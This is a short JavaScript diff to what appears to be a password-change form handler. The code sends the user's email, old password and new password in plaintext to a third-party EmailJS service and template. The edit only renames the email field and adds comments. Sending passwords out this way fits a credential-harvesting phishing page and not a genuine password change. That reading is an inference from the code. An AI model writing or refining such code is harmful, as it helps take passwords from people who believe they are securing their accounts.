@@ -72,8 +72,9 @@
         const old_password = this.old_password.value;
         const new_password = this.new_password.value;
 
+        // Send the form data to EmailJS
         emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
-            email: email,
+            user_email: email,        // This must match the EmailJS template variable
             old_password: old_password,
             new_password: new_password
         })
